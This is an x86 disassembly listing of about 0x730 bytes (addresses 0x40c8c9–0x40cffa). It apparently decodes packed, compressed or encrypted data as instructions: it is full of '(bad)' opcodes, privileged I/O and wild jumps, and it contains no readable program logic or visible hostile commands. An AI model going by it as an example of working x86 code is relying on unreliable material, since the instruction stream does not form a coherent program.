  40c8c9:	xor    eax,0xa49002ca
  40c8ce:	mov    ch,0x71
  40c8d0:	xor    al,0x75
  40c8d2:	jns    0x40c85e
  40c8d4:	jecxz  0x40c85a
  40c8d6:	mov    al,0xe7
  40c8d8:	mov    ebx,0xbfea075
  40c8dd:	inc    eax
  40c8de:	call   0xe860d40e
  40c8e3:	nop    esp
  40c8e6:	je     0x40c8ee
  40c8e8:	sbb    DWORD PTR [eax],ecx
  40c8ea:	pushf  
  40c8eb:	test   cl,cl
  40c8ed:	pop    ss
  40c8ee:	add    eax,0xcfef448b
  40c8f3:	imul   esi,DWORD PTR [eax+0x54],0x7a150916
  40c8fa:	or     eax,0xaeb25e42
  40c8ff:	std    
  40c900:	mov    bh,0x8
  40c902:	jbe    0x40c957
  40c904:	je     0x40c901
  40c906:	jbe    0x40c983
  40c908:	ins    BYTE PTR es:[edi],dx
  40c909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c90a:	jne    0x40c91a
  40c90c:	test   al,0x34
  40c90e:	xlat   BYTE PTR ds:[ebx]
  40c90f:	add    BYTE PTR [eax],al
  40c911:	add    BYTE PTR [eax],al
  40c913:	add    BYTE PTR [eax],al
  40c915:	nop
  40c916:	mov    WORD PTR [edx+0x770d7bfe],?
  40c91c:	shl    edi,0x99
  40c91f:	aas    
  40c920:	pop    ebx
  40c921:	adc    eax,DWORD PTR [edi+0x3]
  40c924:	ret    0xb88
  40c927:	(bad)  
  40c928:	jmp    0x40c8aa
  40c92a:	mov    esp,0x4d1b5657
  40c92f:	pop    edx
  40c930:	xor    ebx,DWORD PTR [edi-0x6c]
  40c933:	(bad)  [edx]
  40c935:	pop    esi
  40c936:	fadd   st(6),st
  40c938:	mov    ah,dl
  40c93a:	out    0xff,eax
  40c93c:	mov    ah,bl
  40c93e:	out    dx,eax
  40c93f:	add    ecx,DWORD PTR [ecx-0x7ae81844]
  40c945:	push   eax
  40c946:	fadd   DWORD PTR [edi-0x1a4d6f4d]
  40c94c:	add    edi,DWORD PTR [edx-0x74874d2e]
  40c952:	sbb    al,0x20
  40c954:	dec    eax
  40c955:	ins    BYTE PTR es:[edi],dx
  40c956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c957:	in     eax,0x98
  40c959:	lods   eax,DWORD PTR ds:[esi]
  40c95a:	nop
  40c95b:	or     al,0xc7
  40c95d:	adc    ebp,0xffffffc7
  40c960:	add    BYTE PTR [edi],0xab
  40c963:	mov    bl,0x5
  40c965:	outs   dx,BYTE PTR ds:[esi]
  40c966:	xor    eax,0xa165ff3e
  40c96b:	push   0xe5f8e7ad
  40c970:	and    eax,0xfe91f19b
  40c975:	adc    dh,bl
  40c977:	jecxz  0x40c975
  40c979:	add    BYTE PTR [eax],al
  40c97b:	add    BYTE PTR [eax],al
  40c97d:	add    BYTE PTR [esi],al
  40c97f:	mov    bl,0x7f
  40c981:	xchg   BYTE PTR [edi],al
  40c983:	jg     0x40c9b0
  40c985:	cdq    
  40c986:	xchg   esp,eax
  40c987:	lock mov eax,ds:0xe0b3a2e7
  40c98d:	test   DWORD PTR [ecx],0x8233f2f9
  40c993:	jb     0x40c97a
  40c995:	js     0x40c94e
  40c997:	es sub ch,al
  40c99a:	and    DWORD PTR [edi],0xffffffea
  40c99d:	fstp   QWORD PTR [edi+ebx*4]
  40c9a0:	and    bh,ah
  40c9a2:	xchg   eax,edi
  40c9a4:	in     eax,0x9b
  40c9a6:	int    0xe3
  40c9a8:	out    0x3,al
  40c9aa:	or     al,0xf3
  40c9ac:	cmp    DWORD PTR [edx],esp
  40c9ae:	sbb    esi,DWORD PTR [edi-0x3f]
  40c9b1:	pop    ss
  40c9b2:	or     eax,0xe9fc19dc
  40c9b7:	sar    BYTE PTR ds:0x18af0926,cl
  40c9bd:	inc    esi
  40c9be:	adc    BYTE PTR [edi-0x3f],dh
  40c9c1:	adc    BYTE PTR [eax+0x7219fd7e],dl
  40c9c7:	pop    edx
  40c9c8:	push   cs
  40c9c9:	btc    DWORD PTR [ebx+0x63a92777],esi
  40c9d0:	sub    al,BYTE PTR [ecx]
  40c9d2:	mov    edi,0x9e831b2b
  40c9d7:	stos   DWORD PTR es:[edi],eax
  40c9d8:	ja     0x40ca1b
  40c9da:	sbb    ebx,edi
  40c9dc:	out    dx,eax
  40c9dd:	dec    esi
  40c9de:	nop
  40c9df:	std    
  40c9e0:	mov    es,ebp
  40c9e2:	add    BYTE PTR [eax],al
  40c9e4:	add    BYTE PTR [eax],al
  40c9e6:	add    bh,ch
  40c9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e9:	push   cs
  40c9ea:	mov    ch,0xfd
  40c9ec:	mov    DWORD PTR [ecx+edx*4],ebp
  40c9ef:	lods   eax,DWORD PTR ds:[esi]
  40c9f0:	sub    DWORD PTR [ebx],ecx
  40c9f2:	mov    dh,0x55
  40c9f4:	ret    
  40c9f5:	into   
  40c9f6:	(bad)
  40c9fa:	jb     0x40ca43
  40c9fc:	into   
  40c9fd:	push   ss
  40c9fe:	stos   BYTE PTR es:[edi],al
  40c9ff:	jns    0x40c9d3
  40ca01:	push   ecx
  40ca02:	rcr    BYTE PTR [edi-0x32],cl
  40ca05:	adc    dh,dh
  40ca07:	adc    DWORD PTR [ecx-0x11],ebp
  40ca0a:	(bad)  
  40ca0b:	jmp    0x40ca39
  40ca0d:	enter  0x4596,0x55
  40ca11:	push   ebx
  40ca12:	push   0xffffffd7
  40ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca15:	retf   
  40ca16:	jb     0x40ca80
  40ca18:	into   
  40ca19:	sbb    dl,cl
  40ca1b:	push   cs
  40ca1c:	in     eax,0xd
  40ca1e:	jmp    0xc32501c1
  40ca23:	loope  0x40ca50
  40ca25:	out    0x1e,al
  40ca27:	pop    es
  40ca28:	cli    
  40ca29:	mov    esp,ecx
  40ca2b:	shl    DWORD PTR [ebx-0x553f4977],0x8b
  40ca32:	mov    eax,ds:0xe9ae0a3b
  40ca37:	xchg   ebx,eax
  40ca38:	mov    dl,0x3b
  40ca3a:	test   eax,0xe90f18fd
  40ca3f:	xchg   ebx,eax
  40ca40:	sub    eax,0xc44c14f0
  40ca45:	into   
  40ca46:	add    BYTE PTR [ecx+0x15],bh
  40ca49:	add    BYTE PTR [eax],0x0
  40ca4c:	add    BYTE PTR [eax],al
  40ca4e:	add    BYTE PTR [eax],al
  40ca50:	sub    DWORD PTR [ebx+0x129d8b5b],esi
  40ca56:	sbb    al,0x56
  40ca58:	mov    dl,0xc2
  40ca5a:	sub    dl,BYTE PTR [edx+edi*4]
  40ca5d:	xor    eax,0xc1b83bf1
  40ca62:	cmp    edi,DWORD PTR [ebx]
  40ca64:	pusha  
  40ca65:	shr    DWORD PTR [ebx],0x8a
  40ca68:	push   es
  40ca69:	cld    
  40ca6a:	mov    cl,0x75
  40ca6c:	stc    
  40ca6d:	sti    
  40ca6e:	mov    cl,0xc2
  40ca70:	mov    ds:0x925a7b3e,al
  40ca75:	sbb    ecx,DWORD PTR [edx+edx*8-0x75b898db]
  40ca7c:	out    0xfb,al
  40ca7e:	mov    cl,0x34
  40ca80:	into   
  40ca81:	sti    
  40ca82:	mov    cl,0xc2
  40ca84:	rol    BYTE PTR [edx+0x7c],cl
  40ca87:	out    dx,al
  40ca88:	xchg   edx,eax
  40ca89:	jb     0x40cae4
  40ca8b:	jmp    esp
  40ca8d:	sahf   
  40ca8e:	sbb    al,0x40
  40ca90:	test   eax,0x7083df77
  40ca95:	dec    ebx
  40ca96:	xor    eax,0x58ff24d9
  40ca9b:	jmp    DWORD PTR [esi+ebx*4+0x77a9401c]
  40caa2:	xlat   BYTE PTR ds:[ebx]
  40caa3:	xor    eax,0x4b
  40caa6:	xor    eax,0x8b0ce4f3
  40caab:	test   ch,0xa8
  40caae:	mov    ebx,ebx
  40cab0:	lds    esp,FWORD PTR [ebx+edi*1+0xd2]
  40cab7:	add    BYTE PTR [eax],al
  40cab9:	in     al,0xe4
  40cabb:	jno    0x40cad3
  40cabd:	dec    esi
  40cabe:	mov    WORD PTR [edx+0x0],?
  40cac1:	pop    esi
  40cac2:	mov    WORD PTR [eax],cs
  40cac4:	sub    edi,ecx
  40cac6:	ret    0x4503
  40cac9:	nop
  40caca:	les    ecx,FWORD PTR [eax+0x3b]
  40cacd:	arpl   WORD PTR [eax-0x1f6d156c],bp
  40cad3:	mov    eax,0x8dcc5032
  40cad8:	cmc    
  40cad9:	xchg   esp,ecx
  40cadb:	mov    dl,0xf6
  40cadd:	dec    esi
  40cade:	loope  0x40ca9d
  40cae0:	and    ah,BYTE PTR [ecx]
  40cae2:	or     ebp,0x4734bb5d
  40cae8:	ret    0xb88
  40caeb:	pop    edi
  40caec:	mov    edi,ecx
  40caee:	cmp    al,0x71
  40caf0:	stc    
  40caf1:	or     eax,0x15133e5f
  40caf6:	mov    ch,0x1f
  40caf8:	or     BYTE PTR [ebx],dl
  40cafa:	aam    0xa4
  40cafc:	call   0x4cd735
  40cb01:	mov    ds:0x909c92cb,eax
  40cb06:	or     ecx,DWORD PTR [eax*4+0x32f416d7]
  40cb0d:	ror    BYTE PTR [ebx-0x6d],1
  40cb10:	nop
  40cb11:	nop
  40cb12:	or     ecx,DWORD PTR [ebx+edx*2]
  40cb15:	or     ebx,DWORD PTR [eax]
  40cb17:	rcl    BYTE PTR [ebx],1
  40cb19:	pop    esi
  40cb1a:	nop
  40cb1b:	pop    ds
  40cb1c:	and    al,0x0
  40cb1e:	add    BYTE PTR [eax],al
  40cb20:	add    BYTE PTR [eax],al
  40cb22:	test   BYTE PTR [eax-0x2594014e],cl
  40cb28:	pop    ds
  40cb29:	xor    bl,BYTE PTR [ebx-0xe]
  40cb2c:	pop    ds
  40cb2d:	and    al,BYTE PTR [edi+0x470f1e14]
  40cb33:	pop    esi
  40cb34:	or     ch,BYTE PTR [ebx]
  40cb36:	xor    BYTE PTR [esi+0x6d6f2b45],0x6f
  40cb3d:	sar    esp,1
  40cb3f:	mov    ds:0xd492c689,eax
  40cb44:	jle    0x40cb5c
  40cb46:	xchg   edi,eax
  40cb47:	mov    dl,0x50
  40cb49:	lock scas al,BYTE PTR es:[edi]
  40cb4b:	leave  
  40cb4c:	xchg   ebx,eax
  40cb4d:	xor    BYTE PTR [ebp+0x9],ah
  40cb50:	cs dec edi
  40cb52:	dec    edi
  40cb53:	lahf   
  40cb54:	adc    eax,0x7cb2d016
  40cb59:	mov    ah,0x12
  40cb5b:	jmp    0x40cbcd
  40cb5d:	in     eax,dx
  40cb5e:	pop    eax
  40cb5f:	jg     0x40cb4a
  40cb61:	push   eax
  40cb62:	das    
  40cb63:	lahf   
  40cb64:	cmc    
  40cb65:	adc    eax,0xcc7cb2d0
  40cb6a:	adc    ch,bl
  40cb6c:	push   eax
  40cb6d:	in     eax,dx
  40cb6e:	and    bh,BYTE PTR [edi-0x1]
  40cb71:	jle    0x40cb78
  40cb73:	jle    0x40cb78
  40cb75:	jg     0x40cb61
  40cb77:	jge    0x40cb60
  40cb79:	hlt    
  40cb7a:	loope  0x40cbaa
  40cb7c:	sub    eax,0x70a59a2a
  40cb81:	das    
  40cb82:	nop
  40cb83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb84:	js     0x40cb87
  40cb86:	add    BYTE PTR [eax],al
  40cb88:	add    BYTE PTR [eax],al
  40cb8a:	add    BYTE PTR [ebx+0x12f89302],bh
  40cb90:	out    dx,eax
  40cb91:	jecxz  0x40cb17
  40cb93:	into   
  40cb94:	scas   eax,DWORD PTR es:[edi]
  40cb95:	mov    ds:0xb75e2ec,eax
  40cb9a:	popf   
  40cb9b:	xchg   ecx,eax
  40cb9c:	leave  
  40cb9d:	hlt    
  40cb9e:	hlt    
  40cb9f:	push   DWORD PTR [ecx+0x6a]
  40cba2:	mov    dl,0x86
  40cba4:	gs sub eax,0xf798cdb1
  40cbaa:	in     al,0xa0
  40cbac:	sub    BYTE PTR [eax+0x32553b49],ah
  40cbb2:	(bad)  
  40cbb3:	(bad)  
  40cbb4:	mov    dl,0x34
  40cbb6:	jge    0x40cba3
  40cbb8:	into   
  40cbb9:	ror    DWORD PTR [esi+0x1b],1
  40cbbc:	xchg   DWORD PTR [ecx],eax
  40cbbe:	adc    BYTE PTR ds:0x12ff30d8,dl
  40cbc4:	jmp    0x40cbd4
  40cbc6:	mov    dh,0xc
  40cbc8:	jae    0x40cc22
  40cbca:	push   ss
  40cbcb:	in     eax,0x77
  40cbcd:	sub    bh,ch
  40cbcf:	out    0xbf,al
  40cbd1:	adc    esi,DWORD PTR [edi]
  40cbd3:	jbe    0x40cb87
  40cbd5:	push   edi
  40cbd6:	xchg   esi,eax
  40cbd7:	sahf   
  40cbd8:	xchg   edx,eax
  40cbd9:	sbb    BYTE PTR [ecx],ch
  40cbdb:	mov    WORD PTR [edi],gs
  40cbdd:	retf   
  40cbde:	cmc    
  40cbdf:	(bad)  
  40cbe0:	outs   dx,DWORD PTR ds:[esi]
  40cbe1:	sub    cl,cl
  40cbe3:	jecxz  0x40cc42
  40cbe5:	pop    ebx
  40cbe6:	push   ds
  40cbe7:	stc    
  40cbe8:	sahf   
  40cbe9:	ret    0xd3da
  40cbec:	mov    dl,0x3b
  40cbee:	xor    BYTE PTR [eax],al
  40cbf0:	add    BYTE PTR [eax],al
  40cbf2:	add    BYTE PTR [eax],al
  40cbf4:	jno    0x40cc1f
  40cbf6:	inc    ebx
  40cbf7:	pop    ds
  40cbf8:	jmp    0x57a9:0xbe56f730
  40cbff:	dec    esi
  40cc00:	xchg   esi,eax
  40cc01:	sbb    BYTE PTR [ecx+ebp*4],0x93
  40cc05:	pop    es
  40cc06:	or     edx,edi
  40cc08:	cmp    cl,BYTE PTR [esi+0x5350e585]
  40cc0e:	push   eax
  40cc0f:	mov    WORD PTR [edi+ebp*8+0x5b],ss
  40cc13:	jb     0x40cc6c
  40cc15:	into   
  40cc16:	push   ds
  40cc17:	mov    dh,0x54
  40cc19:	ja     0x40cc45
  40cc1b:	stc    
  40cc1c:	dec    esi
  40cc1d:	hlt    
  40cc1e:	outs   dx,DWORD PTR ds:[esi]
  40cc1f:	in     al,0xc
  40cc21:	in     al,dx
  40cc22:	out    dx,eax
  40cc23:	adc    ch,BYTE PTR [ebx-0x288a7ca3]
  40cc29:	mov    ds:0x5c938357,eax
  40cc2e:	out    dx,eax
  40cc2f:	aam    0x73
  40cc31:	pushf  
  40cc32:	dec    esi
  40cc33:	jmp    0x6c43bc4a
  40cc38:	push   eax
  40cc39:	into   
  40cc3a:	adc    bh,BYTE PTR [ecx]
  40cc3c:	jecxz  0x40cc99
  40cc3e:	pop    eax
  40cc3f:	into   
  40cc40:	mov    eax,ds:0xa9001bea
  40cc45:	scas   al,BYTE PTR es:[edi]
  40cc46:	enter  0x7744,0x4c
  40cc4a:	lock and BYTE PTR [ecx],0x4b
  40cc4e:	jnp    0x40cc59
  40cc50:	jg     0x40cc9d
  40cc52:	sbb    ebp,DWORD PTR [ebx+ebx*2+0x6f]
  40cc56:	push   cs
  40cc57:	jmp    0x40cc59
  40cc59:	add    BYTE PTR [eax],al
  40cc5b:	add    BYTE PTR [eax],al
  40cc5d:	ins    DWORD PTR es:[edi],dx
  40cc5e:	xor    eax,0x6d39300c
  40cc63:	dec    edi
  40cc64:	pop    ebx
  40cc65:	cli    
  40cc66:	pusha  
  40cc67:	sub    esp,0xffffff98
  40cc6a:	das    
  40cc6b:	imul   edi,esp,0x29
  40cc6e:	add    DWORD PTR gs:[ebp+0x49],0x4575ef5f
  40cc76:	add    dh,bl
  40cc78:	(bad)  
  40cc79:	in     al,0x4a
  40cc7b:	call   0xf18c88da
  40cc80:	mov    ebp,DWORD PTR [ecx+0x31]
  40cc83:	cli    
  40cc84:	jns    0x40cc79
  40cc86:	ja     0x40ccca
  40cc88:	cld    
  40cc89:	popa   
  40cc8a:	mov    esp,0x17e901dd
  40cc8f:	or     BYTE PTR [ebx+0x4584f734],cl
  40cc95:	mov    ch,0x75
  40cc97:	push   cs
  40cc98:	mov    ebp,DWORD PTR [edi+0x1ac3c56c]
  40cc9e:	bound  ebx,QWORD PTR [eax-0x75]
  40cca1:	sub    eax,0x3256ffd3
  40cca6:	retf   0x182a
  40cca9:	inc    edx
  40ccaa:	fadd   QWORD PTR [edx+0x400ecd44]
  40ccb0:	jmp    FWORD PTR ds:0x7e8b0fd3
  40ccb6:	ja     0x40cc79
  40ccb8:	call   0x320e51
  40ccbd:	and    ah,bh
  40ccbf:	mov    ebx,?
  40ccc1:	add    BYTE PTR [eax],al
  40ccc3:	add    BYTE PTR [eax],al
  40ccc5:	add    BYTE PTR [eax+0xd1f3f08],dl
  40cccb:	add    DWORD PTR [edi],edi
  40cccd:	or     eax,0x93f0715
  40ccd2:	or     esp,edx
  40ccd4:	xchg   ebx,eax
  40ccd5:	or     BYTE PTR [ecx-0x25],al
  40ccd8:	or     esp,DWORD PTR [ecx]
  40ccda:	mov    dh,0x8e
  40ccdc:	(bad)  
  40ccdd:	jl     0x40cc71
  40ccdf:	fisttp DWORD PTR [ebx]
  40cce1:	add    BYTE PTR [ebx],cl
  40cce3:	and    dl,BYTE PTR [ebp+edi*1+0x5f0bdb60]
  40ccea:	out    0x9e,al
  40ccec:	jae    0x40ccb0
  40ccee:	fistp  DWORD PTR [edi+ebx*2]
  40ccf1:	mov    esp,DWORD PTR [ebx+ecx*8]
  40ccf4:	mov    esp,DWORD PTR [esp+ebp*1-0x24]
  40ccf8:	inc    ecx
  40ccf9:	(bad)  
  40ccfa:	int    0xb
  40ccfc:	pop    esp
  40ccfd:	jmp    DWORD PTR [ebp+0x144c76e7]
  40cd03:	test   BYTE PTR [edx-0xb],bl
  40cd06:	jns    0x8a4ebc80
  40cd0c:	and    cl,BYTE PTR [edx]
  40cd0e:	or     esp,DWORD PTR [edi]
  40cd10:	test   al,0xe7
  40cd12:	(bad)  
  40cd13:	retf   
  40cd14:	or     al,BYTE PTR [eax]
  40cd16:	sti    
  40cd17:	shl    DWORD PTR [esp+ecx*2-0x68],cl
  40cd1b:	push   esp
  40cd1c:	dec    esi
  40cd1d:	cld    
  40cd1e:	or     ebx,ebx
  40cd20:	je     0x40cce7
  40cd22:	mov    ss:0xcb1b55cc,al
  40cd28:	je     0x40cd37
  40cd2a:	add    BYTE PTR [eax],al
  40cd2c:	add    BYTE PTR [eax],al
  40cd2e:	add    BYTE PTR [eax-0x6fff2474],bh
  40cd34:	inc    ebp
  40cd35:	clc    
  40cd36:	imul   edx,DWORD PTR [eax+0x3014a949],0x13004c11
  40cd40:	cwde   
  40cd41:	neg    DWORD PTR [ebp-0x2d]
  40cd44:	mov    dl,0x2f
  40cd46:	jns    0x40cce9
  40cd48:	mov    DWORD PTR [ebx+ebp*4+0x12],edi
  40cd4c:	lock fsubr DWORD PTR [edi]
  40cd4f:	cdq    
  40cd50:	mov    eax,eax
  40cd52:	sldt   ebp
  40cd55:	and    eax,0x6ae20b04
  40cd5a:	scas   al,BYTE PTR es:[edi]
  40cd5b:	in     eax,dx
  40cd5c:	pushf  
  40cd5d:	dec    ebx
  40cd5e:	add    al,0xbe
  40cd60:	cmp    eax,0xef686b99
  40cd65:	in     eax,0x3
  40cd67:	push   0x9003ee1b
  40cd6c:	cmp    eax,0x3b9be01a
  40cd71:	jmp    0xd6a6ccf4
  40cd76:	push   ebx
  40cd77:	or     DWORD PTR [ecx-0x17],ebp
  40cd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd7b:	test   BYTE PTR [esi-0x2d],bl
  40cd7e:	inc    ebx
  40cd7f:	nop
  40cd80:	cmp    ebp,DWORD PTR [ecx]
  40cd82:	cld    
  40cd83:	out    dx,eax
  40cd84:	mov    dl,0x5c
  40cd86:	add    ah,BYTE PTR [edx-0xe]
  40cd89:	mov    al,0x45
  40cd8b:	shl    BYTE PTR [ebp-0x62047f1b],cl
  40cd91:	mov    ah,0x4e
  40cd93:	add    BYTE PTR [eax],al
  40cd95:	add    BYTE PTR [eax],al
  40cd97:	add    BYTE PTR [esi+0x3d],ah
  40cd9a:	aaa    
  40cd9b:	dec    ebp
  40cd9c:	(bad)  
  40cd9d:	ja     0x40cd70
  40cd9f:	adc    esp,DWORD PTR [edx+edx*2-0x35]
  40cda3:	jecxz  0x40cde2
  40cda5:	aas    
  40cda6:	stos   BYTE PTR es:[edi],al
  40cda7:	fistp  QWORD PTR [edi-0x7e]
  40cdaa:	sbb    eax,0xe5b2c02b
  40cdaf:	xor    BYTE PTR [ebx],0x96
  40cdb2:	rcl    DWORD PTR [edx+eax*4+0x78c56cf1],1
  40cdb9:	jo     0x40cd90
  40cdbb:	sub    eax,0xf7a83d6d
  40cdc0:	xchg   edx,eax
  40cdc1:	cmc    
  40cdc2:	push   cs
  40cdc3:	pusha  
  40cdc4:	push   eax
  40cdc5:	xchg   esi,eax
  40cdc6:	sub    ah,BYTE PTR [edx+0x5e]
  40cdc9:	ret    0xaa23
  40cdcc:	push   ds
  40cdcd:	jge    0x40cdf9
  40cdcf:	add    DWORD PTR [ebx],ecx
  40cdd1:	je     0x40cdfd
  40cdd3:	add    DWORD PTR [ebp*1+0x3434cef0],esp
  40cdda:	iret   
  40cddb:	cmp    al,0xa1
  40cddd:	jae    0x40ce12
  40cddf:	pop    ds
  40cde0:	test   BYTE PTR [ebx+edx*8+0x60],ah
  40cde4:	lods   eax,DWORD PTR ds:[esi]
  40cde5:	mov    BYTE PTR [ebp-0x315b73d1],0x90
  40cdec:	cmp    dh,BYTE PTR [ebx+0x73c8e90e]
  40cdf2:	sub    bl,cl
  40cdf4:	nop
  40cdf5:	repz test DWORD PTR [edi],ebp
  40cdf8:	mov    al,ds:0xe14939
  40cdfd:	add    BYTE PTR [eax],al
  40cdff:	add    BYTE PTR [eax],al
  40ce01:	ret    
  40ce02:	mov    dl,0xe5
  40ce04:	xlat   BYTE PTR ds:[ebx]
  40ce05:	xchg   edx,eax
  40ce06:	mov    dl,0xe
  40ce08:	mov    edx,0x28c5a4ec
  40ce0d:	fwait
  40ce0e:	ins    DWORD PTR es:[edi],dx
  40ce0f:	sbb    dh,BYTE PTR [edx+0x4c]
  40ce12:	stos   DWORD PTR es:[edi],eax
  40ce13:	jo     0x40ce06
  40ce15:	add    al,0x34
  40ce17:	(bad)  
  40ce18:	jmp    0x40c480b0
  40ce1d:	js     0x40ce21
  40ce1f:	xchg   BYTE PTR [ebp-0x587c3c29],dh
  40ce25:	out    dx,eax
  40ce26:	cmp    DWORD PTR [ebx],eax
  40ce28:	jmp    0x6de8:0xe379bdf9
  40ce2f:	push   ds
  40ce30:	popf   
  40ce31:	push   0xffffffda
  40ce33:	into   
  40ce34:	jmp    0xa77580cc
  40ce39:	xchg   edx,eax
  40ce3a:	mov    edi,0xb293078a
  40ce3f:	push   cs
  40ce40:	add    dl,dl
  40ce42:	xchg   ebp,eax
  40ce43:	push   ds
  40ce44:	je     0x40ce9d
  40ce46:	sbb    eax,0x6aad1c4a
  40ce4b:	dec    ecx
  40ce4c:	or     al,0x33
  40ce4e:	mov    edi,0xda558807
  40ce53:	sbb    eax,0x4a4caf74
  40ce58:	sbb    al,0x71
  40ce5a:	(bad)  
  40ce5b:	push   ss
  40ce5c:	mov    ch,BYTE PTR [eax]
  40ce5e:	loop   0x40ceae
  40ce60:	cmp    al,0x70
  40ce62:	int3   
  40ce63:	or     eax,DWORD PTR [eax+0x0]
  40ce69:	add    BYTE PTR [eax],bh
  40ce6b:	(bad)  
  40ce6c:	test   edx,eax
  40ce6e:	lea    esi,[ebp+0x32]
  40ce71:	sbb    DWORD PTR [esi+0x49c26fd9],esp
  40ce77:	and    BYTE PTR [eax],dl
  40ce79:	pxor   mm6,mm5
  40ce7c:	aas    
  40ce7d:	inc    DWORD PTR [ebx+ecx*8+0x19]
  40ce81:	inc    eax
  40ce82:	sub    esp,eax
  40ce84:	mov    al,0x4c
  40ce86:	inc    ebp
  40ce87:	in     eax,0x5e
  40ce89:	mov    BYTE PTR [ebp-0x26],dh
  40ce8c:	sbb    bh,bh
  40ce8e:	inc    esp
  40ce8f:	retf   
  40ce90:	sbb    DWORD PTR [eax+0x29],eax
  40ce93:	cmp    eax,0x3d1a2444
  40ce98:	sar    BYTE PTR [edx],0xc3
  40ce9b:	retf   0xf652
  40ce9e:	aaa    
  40ce9f:	out    dx,eax
  40cea0:	or     eax,0xef80750f
  40cea5:	dec    DWORD PTR [esi+0x36]
  40cea8:	test   DWORD PTR [edx],0xfa6fd824
  40ceae:	in     al,dx
  40ceaf:	leave  
  40ceb0:	adc    BYTE PTR [ebx+0x3b1bd705],cl
  40ceb6:	pop    ss
  40ceb7:	jecxz  0x40ceb9
  40ceb9:	sub    edx,0x13
  40cebc:	icebp  
  40cebd:	call   DWORD PTR [eax+0x780c4454]
  40cec3:	dec    ebp
  40cec4:	aam    0x0
  40cec6:	xchg   DWORD PTR [esi-0x1c],ebx
  40cec9:	(bad)  
  40ceca:	scas   eax,DWORD PTR es:[edi]
  40cecb:	out    dx,eax
  40cecc:	inc    esp
  40cecd:	inc    edx
  40cece:	add    BYTE PTR [eax],al
  40ced0:	add    BYTE PTR [eax],al
  40ced2:	add    BYTE PTR [ebx-0x7506740a],bh
  40ced8:	adc    BYTE PTR [edi-0x532868e8],al
  40cede:	jg     0x40ce69
  40cee0:	fistp  WORD PTR [eax*4-0x152fb60]
  40cee7:	mov    ebx,0x130f02ad
  40ceec:	(bad)  [esi+edi*8+0x445616f]
  40cef3:	test   al,0xcf
  40cef5:	repnz add BYTE PTR [edi+0x57fd9156],cl
  40cefc:	adc    eax,0xa81b4549
  40cf01:	out    0x13,al
  40cf03:	iret   
  40cf04:	cdq    
  40cf05:	inc    edi
  40cf06:	inc    ebp
  40cf07:	or     DWORD PTR [eax-0x6a84ec1a],ebp
  40cf0d:	add    cl,BYTE PTR [edi]
  40cf0f:	adc    eax,0x27feacd1
  40cf14:	sub    ebx,eax
  40cf16:	inc    eax
  40cf17:	es xchg esi,eax
  40cf19:	push   cs
  40cf1a:	add    DWORD PTR [ecx],ecx
  40cf1c:	(bad)  
  40cf1d:	repz jae 0x40ceb8
  40cf20:	enter  0x3ac1,0x86
  40cf24:	jmp    0x40cf42
  40cf26:	xchg   esp,eax
  40cf27:	rcl    DWORD PTR [ecx-0x36],1
  40cf2a:	pop    esi
  40cf2b:	push   esi
  40cf2c:	push   ss
  40cf2d:	xor    DWORD PTR [ebx-0x7638402c],eax
  40cf33:	dec    esi
  40cf34:	fiadd  DWORD PTR [eax+0x4d]
  40cf3a:	add    BYTE PTR [eax],al
  40cf3c:	xchg   esp,eax
  40cf3d:	sbb    cl,dl
  40cf3f:	pop    ebp
  40cf40:	mov    BYTE PTR [edx-0x4977f46c],dh
  40cf46:	push   cs
  40cf47:	sbb    BYTE PTR [ebp+0x450bb7a9],bh
  40cf4d:	mov    edx,0xdba0496c
  40cf52:	dec    ebx
  40cf53:	mov    eax,ds:0xe39bedae
  40cf58:	cmp    eax,0x7fe7a23f
  40cf5d:	or     BYTE PTR ds:0xe5b3c5c0,0x2
  40cf64:	in     al,dx
  40cf65:	xchg   esi,eax
  40cf66:	icebp  
  40cf67:	jmp    0xcafd:0x8b0596eb
  40cf6e:	int3   
  40cf6f:	out    dx,eax
  40cf70:	or     dh,BYTE PTR [ecx+edi*8+0x4]
  40cf74:	push   edi
  40cf75:	cmp    ebp,DWORD PTR [edx]
  40cf77:	call   0xf461092f
  40cf7c:	stos   BYTE PTR es:[edi],al
  40cf7d:	cmc    
  40cf7e:	push   edx
  40cf7f:	push   eax
  40cf80:	lods   al,BYTE PTR ds:[esi]
  40cf81:	retf   0x487e
  40cf84:	je     0x40cf20
  40cf86:	popf   
  40cf87:	in     al,0x45
  40cf89:	in     eax,dx
  40cf8a:	cwde   
  40cf8b:	(bad)  
  40cf8c:	retf   
  40cf8d:	xchg   esi,eax
  40cf8e:	aad    0x4
  40cf90:	inc    edi
  40cf91:	cmp    edi,DWORD PTR [eax]
  40cf93:	cld    
  40cf94:	adc    esi,edx
  40cf96:	loopne 0x40cf1e
  40cf98:	sahf   
  40cf99:	in     al,dx
  40cf9a:	js     0x40cf3d
  40cf9c:	(bad)  
  40cf9d:	test   eax,0xf3df
  40cfa2:	add    BYTE PTR [eax],al
  40cfa4:	add    BYTE PTR [ecx+0xe3b5efc],ah
  40cfaa:	in     eax,dx
  40cfab:	push   eax
  40cfac:	cmp    bl,BYTE PTR [ebx]
  40cfae:	jecxz  0x40d01c
  40cfb0:	push   edx
  40cfb1:	mov    dl,bl
  40cfb3:	mov    ah,0xd1
  40cfb5:	nop
  40cfb6:	mov    dl,0x7c
  40cfb8:	push   edx
  40cfb9:	pushf  
  40cfba:	fidivr DWORD PTR [ecx+edx*8+0x6a0eb290]
  40cfc1:	stos   BYTE PTR es:[edi],al
  40cfc2:	mov    edx,0xbeaa6a0e
  40cfc7:	push   cs
  40cfc8:	(bad)  
  40cfc9:	aam    0x85
  40cfcb:	or     DWORD PTR ds:0x68f6d10d,0x0
  40cfd2:	xchg   ecx,eax
  40cfd3:	or     eax,0xcea193e9
  40cfd8:	imul   ecx,DWORD PTR [edi+0x699a0dba],0x80f08385
  40cfe2:	aaa    
  40cfe3:	(bad)  
  40cfe4:	jmp    0x40cf79
  40cfe6:	mov    dl,0x83
  40cfe8:	xor    al,0xa0
  40cfea:	aaa    
  40cfeb:	push   edx
  40cfec:	stc    
  40cfed:	mov    WORD PTR [ecx],cs
  40cfef:	test   al,bl
  40cff1:	or     cl,BYTE PTR [eax+0x700af12a]
  40cff7:	sub    bl,cl
  40cff9:	dec    esp
  40cffa:	stc    
